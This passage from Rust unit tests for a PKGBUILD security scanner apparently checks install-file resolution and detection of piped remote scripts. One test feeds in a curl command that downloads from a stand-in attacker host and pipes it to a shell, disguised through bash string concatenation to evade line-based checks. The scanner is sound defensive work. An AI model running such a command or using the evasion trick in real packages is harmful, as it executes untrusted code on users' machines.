pkgname=totally-legit-tool
pkgver=1.2.3
pkgrel=1
install=${pkgname}.install
source=("https://github.com/foo/totally-legit-tool/archive/v$pkgver.tar.gz")
build() {
  cd "$pkgname-$pkgver"
  make
}
"#;
        assert_eq!(
            resolve_install_filename(pkgbuild),
            Some("totally-legit-tool.install".to_string())
        );
    }

    #[test]
    fn ast_catches_concatenation_evasion_line_heuristic_would_miss() {
        // `s""h` is bash string concatenation for the literal shell name
        // "sh" at runtime, but no single token in the source text equals
        // "sh" for a naive line-based grep to match. The AST path (tried
        // first in scan_pkgbuild_source) resolves the concatenation and
        // still catches it.
        let src = "curl -sSL https://evil.example.com/x | s\"\"h\n";
        let findings = scan_pkgbuild_source(src);
        assert!(findings.iter().any(|f| f.message.contains("curl/wget | sh")));
    }
}